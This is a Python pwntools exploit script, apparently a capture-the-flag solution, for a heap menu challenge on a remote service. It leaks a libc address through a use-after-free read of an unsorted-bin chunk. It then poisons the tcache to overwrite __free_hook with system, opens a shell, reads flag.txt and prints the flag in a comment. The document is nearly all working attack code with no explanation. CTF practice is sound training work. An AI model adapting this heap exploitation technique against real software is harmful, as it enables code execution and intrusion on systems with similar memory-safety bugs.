#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chall_patched", checksec=False)
context.binary = elf

libc = ELF("./libc-2.31.so", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chall.ehax.tech", 1925)

def menu_new(idx, sz, payload):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"which index?\n> ", str(idx).encode())
    p.sendlineafter(b"how big?\n> ", str(sz).encode())
    p.sendlineafter(b"first payload?\n> ", payload)

def menu_delete(idx):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b"which index?\n> ", str(idx).encode())

def menu_edit(idx, payload):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b"which index?\n> ", str(idx).encode())
    p.sendlineafter(b"New contents?\n> ", payload)

def menu_view(idx):
    p.sendlineafter(b">", b"4")
    p.sendlineafter(b"which index?\n> ", str(idx).encode())
    return p.readline()

menu_new(0, 0x600, b"A") # leak libc from unsorted bin
menu_new(1, 0x600, b"B")
menu_new(2, 0x600, b"C")
menu_delete(1)
leak = u64(menu_view(1)[:-1] + b"\x00\x00")
libc.address = leak - 0x1ecbe0
log.success(f"libc: {hex(libc.address)}")

menu_new(0, 128, b"A") # tcache poisoning
menu_new(1, 128, b"B")
menu_delete(0)
menu_delete(1)
menu_edit(1, p64(libc.sym["__free_hook"]))
menu_new(0, 128, b"/bin/sh")
menu_new(1, 128, b"")
menu_edit(1, p64(libc.sym["system"]))
menu_delete(0)

p.sendline(b"/bin/cat flag.txt")
print(p.readline().decode()[:-1]) # EH4X{fr33_h00k_c4n_b3_p01ns0n3d_1t_s33m5}
